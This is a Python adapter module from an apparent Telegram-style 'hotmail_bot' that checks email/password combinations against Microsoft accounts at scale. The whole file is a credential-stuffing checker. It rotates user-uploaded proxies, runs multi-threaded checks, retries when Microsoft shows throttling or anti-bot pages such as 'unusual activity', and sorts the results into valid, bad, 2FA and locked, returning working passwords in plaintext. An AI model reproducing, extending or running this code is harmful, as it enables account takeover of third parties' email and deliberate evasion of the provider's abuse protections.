"""Brute checker adapter: threading-friendly proxy rotation and result normalization."""

from __future__ import annotations

import random
import threading
import time
from pathlib import Path
from typing import Any, Dict, Optional

from hotmail_bot.core.loader import hotmail_module

_check_account = hotmail_module.check_account

CONFIRM_BAD_RETRIES = 2
# Extra attempts when Microsoft answers with a throttling/anti-bot page instead
# of a real verdict (happens a lot with high thread counts and no proxies).
TRANSIENT_RETRIES = 2
_proxy_load_lock = threading.Lock()

# Reasons that mean "Microsoft blocked us / answered nothing useful", not a
# genuine checker failure. These get an extra retry and are reported as locked.
_TRANSIENT_HINTS = (
    "timeout",
    "timed out",
    "connection",
    "connect failed",
    "network",
    "socket",
    "reset",
    "no token in response",
    "no ppft",
    "no urlpost",
    "oauth flow failed",
    "throttl",
    "too many",
    "rate limit",
    "try again",
    "temporarily",
    "unusual activity",
    "help us protect",
)

# Per-user checker UI settings and optional proxy file
checker_settings: Dict[int, Dict[str, Any]] = {}
_user_proxy_files: Dict[int, Path] = {}
_awaiting_proxy_upload: set[int] = set()


def get_checker_settings(user_id: int, defaults: dict) -> Dict[str, Any]:
    settings = checker_settings.setdefault(user_id, {})
    settings.setdefault("proxy", False)
    settings.setdefault("threads", int(defaults.get("threads") or 25))
    settings.setdefault("search_keywords", defaults.get("search_keywords") or "")
    return settings


def mark_awaiting_proxy_upload(user_id: int, waiting: bool) -> None:
    if waiting:
        _awaiting_proxy_upload.add(user_id)
    else:
        _awaiting_proxy_upload.discard(user_id)


def is_awaiting_proxy_upload(user_id: int) -> bool:
    return user_id in _awaiting_proxy_upload


def set_user_proxy_file(user_id: int, content: str) -> int:
    """Save uploaded proxies for a user and return line count."""
    root = Path(__file__).resolve().parents[2] / "data" / "proxies"
    root.mkdir(parents=True, exist_ok=True)
    path = root / f"{user_id}.txt"
    path.write_text(content.strip() + "\n", encoding="utf-8")
    _user_proxy_files[user_id] = path
    mark_awaiting_proxy_upload(user_id, False)
    return _count_proxy_lines(content)


def user_proxy_count(user_id: int) -> int:
    path = _user_proxy_files.get(user_id)
    if path and path.is_file():
        return _count_proxy_lines(path.read_text(encoding="utf-8", errors="ignore"))
    return 0


def _count_proxy_lines(text: str) -> int:
    return sum(
        1
        for ln in text.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    )


def load_proxy_file(path: str | Path | None = None) -> int:
    """Load proxies into the original module's global rotation pool."""
    proxy_path = Path(path) if path else Path("proxies.txt")
    if not proxy_path.is_file():
        hotmail_module.proxy_list.clear()
        return 0

    lines = [
        ln.strip()
        for ln in proxy_path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]

    with _proxy_load_lock:
        hotmail_module.proxy_list.clear()
        hotmail_module.proxy_list.extend(lines)
        hotmail_module.proxy_idx = 0
        with hotmail_module.stats_lock:
            hotmail_module.bad_proxies.clear()
            hotmail_module.proxy_stats.clear()
            hotmail_module.proxy_fails.clear()
    return len(lines)


def proxy_count() -> int:
    return len(hotmail_module.proxy_list)


def activate_proxies_for_user(user_id: int, default_proxy_file: str) -> int:
    """Load this user's proxy file, or fall back to the global proxies.txt."""
    path = _user_proxy_files.get(user_id)
    if path and path.is_file():
        return load_proxy_file(path)
    return load_proxy_file(default_proxy_file)


def _run_with_proxy(email: str, pw: str, search_q: Optional[str] = None) -> dict:
    proxy_url = hotmail_module.load_proxies_alt()

    if not proxy_url:
        try:
            return _check_account(email, pw, search_q, proxy_url=None)
        except Exception as exc:
            return {"status": "error", "reason": str(exc)[:60], "info": {}}

    try:
        result = _check_account(email, pw, search_q, proxy_url=proxy_url)
        status = result.get("status", "")
        reason = (result.get("reason", "") or "").lower()

        if status == "error":
            if any(
                k in reason
                for k in (
                    "timeout",
                    "connection",
                    "network",
                    "proxy",
                    "socks",
                    "refused",
                    "unreachable",
                    "reset",
                    "broken pipe",
                )
            ):
                hotmail_module.parse_proxy(proxy_url)
                retry_proxy = hotmail_module.load_proxies_alt()
                if retry_proxy and retry_proxy != proxy_url:
                    try:
                        return _check_account(email, pw, search_q, proxy_url=retry_proxy)
                    except Exception:
                        pass
            return result
        if status == "valid":
            hotmail_module.format_proxy(proxy_url)
        return result
    except Exception as exc:
        hotmail_module.parse_proxy(proxy_url)
        retry_proxy = hotmail_module.load_proxies_alt()
        if retry_proxy and retry_proxy != proxy_url:
            try:
                return _check_account(email, pw, search_q, proxy_url=retry_proxy)
            except Exception:
                pass
        return {"status": "error", "reason": str(exc)[:60], "info": {}}


def _raw_check(
    email: str, password: str, use_proxy: bool, search_q: Optional[str]
) -> dict:
    if use_proxy:
        return _run_with_proxy(email, password, search_q)
    return _check_account(email, password, search_q, proxy_url=None)


def _is_transient(result: Optional[dict]) -> bool:
    """True when the answer is a throttle/anti-bot page rather than a verdict."""
    if not result or result.get("status") in ("valid", "bad"):
        return False
    reason = (result.get("reason") or "").lower()
    return any(hint in reason for hint in _TRANSIENT_HINTS)


def categorize_check_result(result: dict) -> str:
    """Map checker result to valid | bad | twofa | locked | error."""
    status = (result or {}).get("status", "error")
    reason = ((result or {}).get("reason") or "").lower()

    if status == "valid":
        return "valid"
    if status == "bad":
        return "bad"
    if "2fa" in reason or "passkey" in reason or "sign in another" in reason:
        return "twofa"
    if any(k in reason for k in ("locked", "blocked", "throttled", "rate limit", "try again")):
        return "locked"
    # Throttling / anti-bot / network answers are Microsoft-side, not a bot fault.
    if any(hint in reason for hint in _TRANSIENT_HINTS):
        return "locked"
    return "error"


def check_hotmail(
    email: str,
    password: str,
    use_proxy: bool = False,
    search_q: Optional[str] = None,
) -> dict:
    try:
        result = _raw_check(email, password, use_proxy, search_q)
        confirmations = 0
        while (result or {}).get("status") == "bad" and confirmations < CONFIRM_BAD_RETRIES:
            confirmations += 1
            confirm = _raw_check(email, password, use_proxy, search_q)
            if (confirm or {}).get("status") and confirm.get("status") != "bad":
                result = confirm
                break

        # Ride out Microsoft's anti-bot pages instead of dumping them as errors.
        transient_attempts = 0
        while _is_transient(result) and transient_attempts < TRANSIENT_RETRIES:
            transient_attempts += 1
            time.sleep(random.uniform(1.0, 2.5) * transient_attempts)
            retry = _raw_check(email, password, use_proxy, search_q)
            result = retry or result
            if not _is_transient(result):
                break
    except Exception as e:
        result = {"status": "error", "reason": str(e)[:60], "info": {}}

    result = result or {}
    return {
        "status": result.get("status", "error"),
        "email": email,
        "pass": password,
        "reason": result.get("reason", ""),
        "info": result.get("info") or {},
        "via": result.get("via", "?"),
        "domain": result.get("domain", ""),
        "category": categorize_check_result(result),
    }
